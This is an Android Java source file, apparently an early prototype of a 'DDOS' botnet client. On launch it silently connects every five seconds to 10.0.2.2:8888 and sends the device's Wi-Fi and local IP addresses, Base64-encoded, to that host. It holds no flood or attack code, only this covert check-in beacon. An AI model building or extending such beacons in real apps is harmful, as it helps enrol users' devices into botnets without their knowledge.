package com.a.androidDDOS;

import android.net.wifi.WifiManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.format.Formatter;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.Enumeration;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import android.util.Base64;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ScheduledExecutorService exec = Executors.newSingleThreadScheduledExecutor();
        exec.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                try {
                    System.out.println("Run thread");
                    Socket echoSocket = new Socket("10.0.2.2", 8888);
                    PrintWriter out =
                            new PrintWriter(echoSocket.getOutputStream(), true);
                    BufferedReader in =
                            new BufferedReader(
                                    new InputStreamReader(echoSocket.getInputStream(), "UTF-8"));
                    BufferedReader stdIn =
                            new BufferedReader(
                                    new InputStreamReader(System.in));

                    out.println(Base64.encodeToString((getIpV4Addr() + " " + getLocalIpAddress()).getBytes(), Base64.DEFAULT));
                    System.out.println("echo: " + in.readLine());
                    echoSocket.close();
                    out.close();
                    in.close();
                    stdIn.close();
                    System.out.println("closed all resources");
                } catch (
                        UnknownHostException e) {
                    System.err.println("Don't know about host " + "10.0.2.2");
                    System.exit(1);
                } catch (IOException e) {
                    System.err.println("Couldn't get I/O for the connection to " +
                            "10.0.2.2");
                    System.exit(1);
                }
            }
        }, 0, 5, TimeUnit.SECONDS);
    }


    private String getIpV4Addr() {
        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        return Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
    }

    public static String getLocalIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
                        return inetAddress.getHostAddress();
                    }
                }
            }
        } catch (SocketException ex) {
            ex.printStackTrace();
        }
        return null;
    }

}
